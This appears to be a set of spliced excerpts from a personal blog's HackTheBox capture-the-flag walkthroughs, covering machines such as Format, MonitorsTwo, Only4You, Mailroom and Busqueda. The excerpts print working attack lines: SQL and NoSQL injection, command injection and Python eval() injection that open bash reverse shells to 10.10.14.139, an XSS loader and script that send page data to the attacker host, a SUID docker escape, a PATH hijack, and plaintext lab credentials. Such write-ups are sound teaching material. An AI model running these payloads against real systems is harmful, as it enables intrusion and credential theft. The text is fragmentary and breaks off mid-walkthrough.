When we examine the network traffic data with Wireshark, we see only one data object associated with windowsliveupdater.com, which makes the process easier.\nIf we follow this stream, we can see a large chunk of data, clearly encoded:\nAfter spending some time trying to reverse the encoding steps listed from our lnk file, I wasn\u0026rsquo;t getting a reasonable answer. Those with a sharp eye, however, might have noticed right away that this data chunk is being sent from the target, to our victim. Meaning, the decoding actions done in the lnk file is the way to decode. Instead of reversing the steps, we just need to replicate them.

Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 205.03 seconds There is very little information right out the gate, only a port that nmap fails to identify. However, quick google searching shows that this port is used in gRPC API. Interacting with it requires a specific protocol, so we need to use a tailored program. While I initially started enumeration with grpc_cli and this resource, I had a lot of trouble passing a login token and switched to Postman API. As such, I will cover only using Postman from the beginning.\nInteracting with gRPC via Postman To use, simply extract the tarball and run Postman binary:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ┌──(kali㉿kali)-[~/Documents/pc] └─$ tar -xvf postman-linux-x64.tar.gz Postman/ Postman/app/ Postman/app/icons/ \u0026lt;...SNIP...\u0026gt; Postman/app/locales/ru.pak Postman/Postman ┌──(kali㉿kali)-[~/Documents/pc] └─$ cd Postman ┌──(kali㉿kali)-[~/Documents/pc/Postman] └─$ ls app Postman ┌──(kali㉿kali)-[~/Documents/pc/Postman] └─$ ./Postman The GUI will open up, and we can create an account or skip for now: We can set up our request first by selecting gRPC: Now when we supply the URL, API methods will be loaded automatically thanks to server reflection query: First, we can try to register a user. Once again, the query is made easy with Postman\u0026rsquo;s \u0026ldquo;use example message\u0026rdquo; feature. It will create for us a structured JSON message with all necessary parameters. For my account, I edited the example to have a username/password of asdf. Next, we can log in. The server responds with giving us an id number. Notice also, the Trailers tab. This will contain our login token, which we must supply for logged-in activities. Selecting the Trailers tab we can view: To use this token, we can go to the Metadata tab, and add the key as \u0026rsquo;token\u0026rsquo; and the value the copied value from Trailers, omitting the b\u0026rsquo;\u0026rsquo;. Finally, we can use the getInfo function. \u0026ldquo;Use Example Message\u0026rdquo; will again auto-suggest a valid JSON request, that we can use to supply our own id value: SQL Injection in getInfo function After trying several things, we might learn that this API is vulnerable to SQL injection. In the below example, I use UNION injection to insert the number \u0026lsquo;1\u0026rsquo; in the response: First, we can determine the database type by enumerating versions. This way, I find that the service is using sqlite: Using a query from PayloadAllTheThings, I am able to dump databases. We are likely already seeing messages, and accounts will have interesting information. Next, enumerating the columns in table accounts: Seeing \\n\\t simply refers to a newline, followed by tab indentation. There are 2 column entries, username and password. First, finding password: Now with a password, we can find a matching username: Although we have a username, this does not really seem like a password that a user \u0026lsquo;admin\u0026rsquo; would have. With my current injection, I am just retrieving the first entry in the username field. However, we can be extra sure to match the username \u0026amp; password by using WHERE: Finally, we have a credential pair of sau:HereIsYourPassWord1431.

This is Arbitrary File Write, an extremely dangerous oversight. However, this seems largely mitigated by removing write permissions in other folders.\nAlso under the edit page, we can see that if isPro is set, there exists a folder that retains writing privileges:\n1 2 3 4 5 6 7 8 9 10 11 function provisionProUser() { if(isPro() === \u0026#34;true\u0026#34;) { $blogName = trim(urldecode(getBlogName())); system(\u0026#34;chmod +w /var/www/microblog/\u0026#34; . $blogName); system(\u0026#34;chmod +w /var/www/microblog/\u0026#34; . $blogName . \u0026#34;/edit\u0026#34;); system(\u0026#34;cp /var/www/pro-files/bulletproof.php /var/www/microblog/\u0026#34; . $blogName . \u0026#34;/edit/\u0026#34;); system(\u0026#34;mkdir /var/www/microblog/\u0026#34; . $blogName . \u0026#34;/uploads \u0026amp;\u0026amp; chmod 700 /var/www/microblog/\u0026#34; . $blogName . \u0026#34;/uploads\u0026#34;); system(\u0026#34;chmod -w /var/www/microblog/\u0026#34; . $blogName . \u0026#34;/edit \u0026amp;\u0026amp; chmod -w /var/www/microblog/\u0026#34; . $blogName); } return; } After all commands are finished, we are left with an /uploads folder under our blog, with 700 permissions. The creator, in this case the web service account, can read/write/execute files within this location. The exploit chain is now clear. If we can trigger provisionProUser, we will be able to write a webshell in the uploads folder using Arbitrary File Write. This function is dependent on isPro() being set to true.

However, this is where the namesake of the box \u0026ldquo;Format\u0026rdquo; comes into play: the vulnerability lies in how python handles content with the format function from the strings package. You can read more about the vulnerability here.

I liked how the box had a central focus on the redis applications, even to the point where we need to use it three times, each with a different goal and technique. The privilege escalation to root, however, I found to be rather frustratingly inconspicuous. It felt that if someone was unaware of particular python interactions, then there was very little chance to figure it out without external guidance. Moreover, having the secret key also being the root password is weird, a little too much like a CTF challenge.\n","date":"2023-09-30T09:11:52-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-format/Format_hucfdd9eb173c0886a8604431711aec1ea_316610_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-format/","title":"HackTheBox - Format"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Starting Nmap 7.94 ( https://nmap.org ) at 2023-05-07 20:21 EDT Nmap scan report for 10.10.11.212 Host is up (0.043s latency).

One of the features of this scanner is we can supply our own virus signature databases, and we are also able to specify how we might treat \u0026ldquo;infected\u0026rdquo; files. My idea was to create an extremely generic virus database, one that will flag whichever file I want even when I can\u0026rsquo;t read it. Next, I scan my own authorized_keys file, and set the scan to move infected files to /root/.ssh/. When this happens, I will be able to authenticate once again with my own key.\nUsing this resource to generate a vague database.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability. CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability. CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed. We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department. Best regards, Administrator CISO Monitor Two Security Team We are detailed 3 CVEs that the box is vulnerable to, at least once this mail letter has been sent. We can do quick checks to see if any of these have been remediated in our box: Checking kernel version (CVE-2021-33033)\n1 2 marcus@monitorstwo:~$ uname -a Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux Our version was compiled in March 2023, while the CVE is listed with the year 2021. This kernel version will likely not be vulnerable to CVE-2021-33033.\nCVE-2020-25706 is related to cacti version 1.2.13. Recall on the login page as well as the CHANGELOG, we saw our cacti version at the higher 1.2.22, meaning this is not a valid attack route.\nChecking docker version(CVE-2021-41091)\n1 2 3 4 5 6 7 8 9 10 11 marcus@monitorstwo:~$ docker version Client: Version: 20.10.5+dfsg1 API version: 1.41 Go version: go1.15.9 Git commit: 55c4c88 Built: Wed Aug 4 19:55:57 2021 OS/Arch: linux/amd64 Context: default Experimental: true Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get \u0026#34;http://%2Fvar%2Frun%2Fdocker.sock/v1.24/version\u0026#34;: dial unix /var/run/docker.sock: connect: permission denied The docker version is old, meaning CVE-2021-41091 is a potential target.\nAbusing CVE-2021-41091 We can get more information about CVE-2021-41091 here, by the person who discovered the bug. This exploit takes advantage that user id\u0026rsquo;s within docker containers and outside the docker containers are shared. So we can create a file with a user inside the docker container, and when accessing the file from outside the docker container, the user id will be retained. This characteristic is normal for linux, but what is not normal is a regular user being able to enter the docker container\u0026rsquo;s filesystem. This is ideal for our situation, where we control root from inside the container. The workflow will look something like this:\nAs root within docker, create a bash binary with SUID binary set. Any user can run this as root, and get a root bash session. As marcus outside the container, find the container location in the file system As marcus, access the bash binary. Because this SUID binary was made with user ID 0, it will still be treated as such, meaning the system\u0026rsquo;s root user. As marcus, execute the SUID binary and obtain a root shell escaped from the docker session Using findmnt to locate docker filesystems 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 marcus@monitorstwo:~$ findmnt TARGET SOURCE FSTYPE OPTIONS / /dev/sda2 ext4 rw,relatime ├─/sys sysfs sysfs rw,nosuid,nodev,noexec,relatime │ ├─/sys/kernel/security securityfs securityfs rw,nosuid,nodev,noexec,relatime \u0026lt;...SNIP...\u0026gt; ├─/run tmpfs tmpfs rw,nosuid,nodev,noexec,relatime,size=402608k,mode=755 │ ├─/run/lock tmpfs tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k │ ├─/run/docker/netns/2a35f1c292bd nsfs[net:[4026532597]] │ │ nsfs rw │ ├─/run/user/1000 tmpfs tmpfs rw,nosuid,nodev,relatime,size=402608k,mode=700,uid=1000,gid=1 │ └─/run/docker/netns/22acd79d4ced nsfs[net:[4026532659]] │ nsfs rw ├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged │ overlay overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7H ├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm │ shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k ├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged │ overlay overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4B └─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k There are several docker files it looks like, and we want to know which is ours.

Linux\u0026rsquo;s UID handling and ownership is something I find to be quite interesting, especially in cases like these, where the permissions of a root user on a restricted environment can still be abused outside the scope. The article on CVE-2021-41091 was a blast to read, and I\u0026rsquo;m glad I know more than before!\n","date":"2023-09-02T12:27:00-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-monitorstwo/MonitorsTwo_hu024166abe3ac2c9d2978be07dc4c2b69_418807_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-monitorstwo/","title":"HackTheBox - MonitorsTwo"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Starting Nmap 7.94 ( https://nmap.org ) at 2023-04-22 16:11 EDT Nmap scan report for 10.10.11.210 Host is up (0.038s latency).

However, form is very generic and does not exist in the pip library. This is likely coming from another python file somewhere. Since non-library imports follow current working directory schema, we know that form.py will also exist in this same folder. If, perhaps, it existed in tools/form.py, we would see the import line reflect this: from tools.form import sendmessage.\nViewing form.py:\n1 $ curl http://beta.only4you.htb/download -d \u0026#34;image=/var/www/only4you.htb/form.py\u0026#34; Full code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 import smtplib, re from email.message import EmailMessage from subprocess import PIPE, run import ipaddress def issecure(email, ip): if not re.match(\u0026#34;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]{2,})\u0026#34;, email): return 0 else: domain = email.split(\u0026#34;@\u0026#34;, 1)[1] result = run([f\u0026#34;dig txt {domain}\u0026#34;], shell=True, stdout=PIPE) output = result.stdout.decode(\u0026#39;utf-8\u0026#39;) if \u0026#34;v=spf1\u0026#34; not in output: return 1 else: domains = [] ips = [] if \u0026#34;include:\u0026#34; in output: dms = \u0026#39;\u0026#39;.join(re.findall(r\u0026#34;include:.*\\.[A-Z|a-z]{2,}\u0026#34;, output)).split(\u0026#34;include:\u0026#34;) dms.pop(0) for domain in dms: domains.append(domain) while True: for domain in domains: result = run([f\u0026#34;dig txt {domain}\u0026#34;], shell=True, stdout=PIPE) output = result.stdout.decode(\u0026#39;utf-8\u0026#39;) if \u0026#34;include:\u0026#34; in output: dms = \u0026#39;\u0026#39;.join(re.findall(r\u0026#34;include:.*\\.[A-Z|a-z]{2,}\u0026#34;, output)).split(\u0026#34;include:\u0026#34;) domains.clear() for domain in dms: domains.append(domain) elif \u0026#34;ip4:\u0026#34; in output: ipaddresses = \u0026#39;\u0026#39;.join(re.findall(r\u0026#34;ip4:+[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[/]?[0-9]{2}\u0026#34;, output)).split(\u0026#34;ip4:\u0026#34;) ipaddresses.pop(0) for i in ipaddresses: ips.append(i) else: pass break elif \u0026#34;ip4\u0026#34; in output: ipaddresses = \u0026#39;\u0026#39;.join(re.findall(r\u0026#34;ip4:+[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[/]?[0-9]{2}\u0026#34;, output)).split(\u0026#34;ip4:\u0026#34;) ipaddresses.pop(0) for i in ipaddresses: ips.append(i) else: return 1 for i in ips: if ip == i: return 2 elif ipaddress.ip_address(ip) in ipaddress.ip_network(i): return 2 else: return 1 def sendmessage(email, subject, message, ip): status = issecure(email, ip) if status == 2: msg = EmailMessage() msg[\u0026#39;From\u0026#39;] = f\u0026#39;{email}\u0026#39; msg[\u0026#39;To\u0026#39;] = \u0026#39;info@only4you.htb\u0026#39; msg[\u0026#39;Subject\u0026#39;] = f\u0026#39;{subject}\u0026#39; msg[\u0026#39;Message\u0026#39;] = f\u0026#39;{message}\u0026#39; smtp = smtplib.SMTP(host=\u0026#39;localhost\u0026#39;, port=25) smtp.send_message(msg) smtp.quit() return status elif status == 1: return status else: return status Foothold Command Injection vulnerability in message form Within issecure, the re.match follows a rather complex regex. To get a more thorough understanding as to what is passing or failing, the simplest approach is to use a regex matcher\nWe can see we need a string of letters or numbers (one .- or _ allowed), followed by a @, another string of letters or numbers, followed by a ., then at least 2 more letters to pass. The next interesting component is the operations domain and result. Our query is split by the @ symbol, and the second field is run through a dig:\n1 2 domain = email.split(\u0026#34;@\u0026#34;, 1)[1] result = run([f\u0026#34;dig txt {domain}\u0026#34;], shell=True, stdout=PIPE) Since the regex is not performing any filtering, we can add whatever we want following our valid asdf@asf.com, and this will enter the dig command. Using this, we can abuse command injections:\n1 $ curl http://only4you.htb/ -d \u0026#34;email=asdf@asdf.com;%20curl%2010.10.14.139\u0026amp;subject=\u0026amp;message=\u0026#34; Meanwhile on my listener:\n1 2 3 4 5 6 7 $ nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.139] from (UNKNOWN) [10.10.11.210] 42580 GET / HTTP/1.1 Host: 10.10.14.139 User-Agent: curl/7.68.0 Accept: */* We can use this to spawn a reverse shell:\n1 bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.139/8888 0\u0026gt;\u0026amp;1 payload:\n1 $ curl http://only4you.htb/ -d \u0026#34;email=asdf@asdf.com;%3b+bash+-c+\u0026#39;/bin/bash+-i+\u0026gt;%26+/dev/tcp/10.10.14.139/8888+0\u0026gt;%261\u0026#39;\u0026amp;subject=\u0026amp;message=\u0026#34; On listener:\n1 2 3 4 5 $ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.139] from (UNKNOWN) [10.10.11.210] 54938 whoami www-data Enumerating the system as www-data Running netstat, we find unusual ports open:\n1 2 3 4 5 6 7 8 9 www-data@only4you:/$ netstat -ano Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State Timer tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 127.0.0.1:3000 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 127.0.0.1:8001 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN off (0.00/0/0) These ports can be viewed internally via chisel.

The change looks potentially interesting, so we can we can check the changes with this commit.\nInformation on a private subdomain is leaked The change is focused on not sending more 2fa requests if a minute has not passed. However, it is worth noting that we find yet another subdomain this way: http://staff-review-panel.mailroom.htb. Based on the sensitive nature of the title, we shouldn\u0026rsquo;t expect to be able to access this page externally or without credentials. Visitng the page shows that it is publicly accessible, but needs some additional authentication.\nFoothold Leveraging XSS to reach the private subdomain Recalling the XSS trick discovered earlier, we were able to redirect someone\u0026rsquo;s or something\u0026rsquo;s session back to our machine, although there were no cookies for that main site. Perhaps this exploited session is able to access this subdomain for us?\nThis exploit idea is also covered in write-ups for crossfit, an insane difficulty box previously retired. The idea is to abuse XSS to perform requests as an authorized user, then relay the information back to our machine in the form of http post requests.\nInstead of crafting a new XSS payload every time, it is easier to write an XSS that retrieves a script from our local machine and then executes it: \u0026lt;script src=\u0026quot;http://10.10.14.35/at.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\nTo make the process even more simple, we can write the request as a curl request. Burp Repeater is good for this as well:\n1 curl -X POST http://mailroom.htb/contact.php -d \u0026#34;email=\u0026lt;script+src%3d\u0026#34;http%3a//10.10.14.35/at.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026amp;title=a\u0026amp;message=a\u0026#34; Now when the XSS activates, it will reach back to our attacker address 10.10.14.35 and execute script from at.js. I can easily make quick edits to at.js and send another curl to execute a new command. at.js (inspired from 0xdf\u0026rsquo;s crossfit writeup):\n1 2 3 4 5 6 7 8 9 10 11 var fetch_req = new XMLHttpRequest(); fetch_req.onreadystatechange = function() { if(fetch_req.readyState == XMLHttpRequest.DONE) { var exfil_req = new XMLHttpRequest(); exfil_req.open(\u0026#34;POST\u0026#34;, \u0026#34;http://10.10.14.35:9001\u0026#34;, false); exfil_req.send(\u0026#34;Resp Code: \u0026#34; + fetch_req.status + \u0026#34;\\nPage Source:\\n\u0026#34; + fetch_req.response); } }; fetch_req.open(\u0026#34;GET\u0026#34;, \u0026#34;http://staff-review-panel.mailroom.htb/\u0026#34;, false); fetch_req.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); fetch_req.send(); In this script, we have a GET request pointed at staff-review-panel, then the content is sent back to our attacking machine, port 9001 as a POST.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ nc -vlp 9001 listening on [any] 9001 ... connect to [10.10.14.35] from (UNKNOWN) [10.10.11.209] 33536 POST / HTTP/1.1 Host: 10.10.14.35:9001 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/ Content-Type: text/plain;charset=UTF-8 Content-Length: 2399 Origin: http://127.0.0.1 Connection: keep-alive Resp Code: 200 Page Source: \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;...SNIP...\u0026gt; Examining the source code a little we can find that it actually matches the gitea staffroom code.

However, we can achieve the same results with vague regex statements. By abusing regex guesses, we can piece together a valid email and password combination, letter by letter:\n1 2 3 fetch_req.open(\u0026#34;POST\u0026#34;, \u0026#34;http://staff-review-panel.mailroom.htb/auth.php\u0026#34;, false); fetch_req.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); fetch_req.send(\u0026#34;email[$regex]=^t*\u0026amp;password[$ne]=asdf\u0026#34;); In the above code, I designate the start of the string as ^, guess the first letter, then wildcard the rest of the string with *. The regex will only pass when the guessed first letter is correct, the t. This method will take forever, so I used regex ranges to cover multiple letter guesses at once. By guessing half the alphabet in the first query, I can eliminate multiple letters that don\u0026rsquo;t fit. Not as fast as creating a script to automate this, but still saves considerable time:\n1 fetch_req.send(\u0026#34;email[$regex]=^t{a-m}.*\u0026amp;password[$ne]=asdf\u0026#34;); This regex fails, so we know the 2nd letter is between n-z.\nAfter some time, we finally get the full email: tristan@mailroom.htb. Now we can do the same for passwords, but it\u0026rsquo;s good to remember the characters might also be capitalized, numeric, or a special char. In this case, I start by setting the regex for all uppercase letters:\n1 fetch_req.send(\u0026#34;email=tristan@mailroom.htb\u0026amp;password[$regex]=^{A-Z}.*\u0026#34;); The first letter is not an uppercase letter, and a second query shows it is neither a lowercase letter. Next we can check any single digit number:\n1 fetch_req.send(\u0026#34;email=tristan@mailroom.htb\u0026amp;password[$regex]=^[0-9].*\u0026#34;); Eventually, we can leak the full password as well. Now we have credentials:\n1 email=tristan@mailroom.htb\u0026amp;password=69trisRulez! With this, we can access the machine through ssh:\n1 2 3 4 5 6 7 8 9 10 $ ssh tristan@mailroom.htb The authenticity of host \u0026#39;mailroom.htb (10.10.11.209)\u0026#39; can\u0026#39;t be established.

Monitoring the folder for a little bit, we can see the lock file appear and disappear very frequently. It seems someone is accessing the keepass vault regularly. If we can perhaps spy on the session that is accessing this vault, we might be able to watch the password being input.\nUsing strace to monitor processes in real time This article covers strace and how it might be used to leak ssh passwords. If we know the process ID that is accessing this kdbx, we can utilize this strategy.\nTo watch processes in real time, I use top:\n1 matthew@mailroom:~$ top We can see kpcli (the keepass command line interface program) and its PID, as it appears and disappears in real time. In another shell session, I submit an strace process once I see kpcli appear:\nstrace output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 matthew@mailroom:~$ strace -p 107030 strace: Process 107030 attached pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3]) read(3, \u0026#34;m\u0026#34;, 1) = 1 select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout) write(4, \u0026#34;m\u0026#34;, 1) = 1 pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3]) read(3, \u0026#34;a\u0026#34;, 1) = 1 select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout) write(4, \u0026#34;a\u0026#34;, 1) = 1 pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3]) read(3, \u0026#34;t\u0026#34;, 1) = 1 select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout) write(4, \u0026#34;t\u0026#34;, 1) = 1 \u0026lt;...SNIP...\u0026gt; The output is messy, but we can see the information of letters being inputted and an echo, likely related to the character being reflected back in the command line.

If we exclude that input, the password becomes !sEcUr3p4$$w01rd9. Trying this password does not work, but looking at the password itself the 1 seems out of place: the password appears to be the words secure and password. Omitting 1 gives us a working password: !sEcUr3p4$$w0rd9, and now the \\10 character becomes more clear: the user must have inputted a 1 as a mistake, then deleted it with backspace. The deletion keystroke appeared in the trace as \\10, and the password was fixed for login purposes.\nViewing the keepass vault shows multiple password entries, but one is clearly more noteworthy than the rest: the root account.\nWe can right click and select copy password to temporarily place the password into our clipboard, or we can view the password plain through edit entry:\nWith this, we can su to root straight from matthew:\n1 2 3 matthew@mailroom:~$ su Password: root@mailroom:/home/matthew# Bonus: inspecting the scripts from the root folder shows that the \\10 char is indeed a deletion\n1 2 3 4 5 6 7 8 9 10 #!/usr/bin/python3 import os, random, time, hashlib import pexpect ## This script is used to simulate matthew logging into his database in real time \u0026lt;...SNIP...\u0026gt; send_human(k, f\u0026#39;open {db_path}\u0026#39;) k.expect(\u0026#39;Please provide the master password: \u0026#39;) send_human(k, \u0026#39;!sEcUr3p4$$w01\\010rd9\u0026#39;) # \\010 is a del character Reflection As my first live hard box completion, I was thoroughly impressed by the complexity of the attack chain leveraged to gain a foothold. Between the constant abuse of XSS to the extremely frequent kpcli processes, this box might not be the most realistic, but I enjoyed every trick utilized throughout. I also appreciated the \u0026ldquo;leaked code\u0026rdquo; viewable on the git subdomain, and how it is used to showcase multiple different code vulnerabilities used at different spots within this box.\n","date":"2023-08-19T22:25:45-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-mailroom/Mailroom_hu83fa4872cdc769af1a6c4264f0edd42d_354362_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-mailroom/","title":"HackTheBox - Mailroom"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Nmap 7.93 scan initiated Sun Apr 9 07:47:17 2023 as: nmap -sCV -oN nmap_initial.txt 10.129.203.183 Nmap scan report for 10.129.203.183 Host is up (0.023s latency).

We are given a wide selection of search engines to use, and then we can detail our search query as well:\nWe also see the option to auto redirect, but at first glance I have no idea what that means. When I select the engine Google and something to search, pressing the Search button results in the generation of a url that we might copy/paste into our browser.\nThis is how the search engine works: you supply the engine and the query, and the webpage will generate a link that can take you to a query using that search engine. Auto-redirect probably configures you to be taken directly to the link rather than this page showing nothing but the link text.\nExamining the bottom of the searcher page, we can see the web service is using Flask, and also that this searchor tool is open source:\nClicking on the Searchor 2.4.0 hyperlink redirects us to a github page\nEnumerating github pull requests and patch histories We can see from github that this is not the most recent version of searchor, so perhaps this version might have an unpatched vulnerability? For popular vulnerabilities, we can simply google search \u0026ldquo;Service Version X.X.X exploit\u0026rdquo; and get plenty of information. However, if Searchor is not big enough it might not get the same level of attention. In this case, it might be more fruitful to look at the version history for searchor, and see if there is any mention of patching an exploit. We can see in the overview for v2.4.2, there is a patched vulnerability mentioned\nSince the webpage is still using 2.4.0, this vulnerability should still exist, if we are able to take advantage. When we look at the link, the details say the search method in the code is utilizing an unsafe eval operation that can allow for arbitrary code execution.\nTo understand a little more, we can look at the code being changed in this pull request:\nWe can see here the two arguments we will provide the service, first being the engine, followed by query. It appears as though if we can escape the single quote wrapping around query, we might be able to directly call arguments in python\u0026rsquo;s eval() statement.\nBy editing the request in burpsuite, we can see when we supply a single ' mark, the request breaks.\nIf we can supply new arguments in the proper syntax, we can achieve code execution.\nFoothold Obtaining shell access as user svc After a little bit of trial and error, I managed to achieve code execution:\nIn addition to the single quote, we also needed ) to end the search function, followed by a , to supply a 2nd object to eval. __import__('os').system() is our set up for command execution, where we supply the shell command in system(). From here, a reverse shell can be obtained by searching for a bash rev shell payload:\n1 asdf\u0026#39;),__import__(\u0026#39;os\u0026#39;).system(\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.139/8888 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;) # I found that this command had trouble executing from burpsuite, but has no issue if you simply return to the webpage and execute from your browser.

However, exploring a little deeper, we can start to see what might be going on:\n1 2 3 svc@busqueda:/var/www/app/.git$ cat logs/HEAD cat logs/HEAD 0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator \u0026lt;administrator@gitea.searcher.htb\u0026gt; 1671970461 +0000 commit (initial): Initial commit When examining the current commit id, we can see the .git is not even associated with the github page Searchor. Instead, it looks like administrator built this webpage personally, utilizing Searchor 2.4.0 code, then created a new git repository with Gitea instead! Gitea is a git-based service that can be self-hosted. Its purpose is similar to Github, but with the option for completely private hosting it allows for a much more isolated development workflow that might never leave a company\u0026rsquo;s infrastructure.\nThe new subdomain is particularly interesting, gitea.searcher.htb. Perhaps if we add this to our /etc/hosts file, we might view it ourselves?\n1 2 3 4 5 6 7 8 9 10 $ tail /etc/hosts # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.11.208 searcher.htb gitea.searcher.htb Viewing the website:\nSearching around, we can see users administrator and cody, but no repositories are publicly viewable.\nFinding credentials and testing for password re-use When looking back at the .git/config file, we can find credentials:\n1 2 3 4 5 6 7 8 9 10 11 12 13 svc@busqueda:/var/www/app/.git$ cat config cat config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \u0026#34;origin\u0026#34;] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \u0026#34;main\u0026#34;] remote = origin merge = refs/heads/main We can see in plaintext, cody\u0026rsquo;s password of jh1usoih2bkjaspwe92. If there were a user named cody on the system, my first thought would be to check su to see if i can change my shell user to cody. However, only user svc exists on the box. Still, it might be that user svc was set up by cody, using the same password?

Meaning, we can create our own full-checkup.sh in a current working directory, execute full-checkup as root, and our own full-checkup.sh will be ran instead.\nAbusing File Path Manipulation First I enter a directory where i can write files:\n1 2 svc@busqueda:~$ cd /dev/shm svc@busqueda:/dev/shm$ Next, I create a simple reverse shell script under the name full-checkup.sh:\n1 2 3 4 svc@busqueda:/dev/shm$ cat full-checkup.sh #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.139/8888 0\u0026gt;\u0026amp;1 On my kali machine, I set up a listener:\n1 2 $ nc -nvlp 8888 listening on [any] 8888 ...

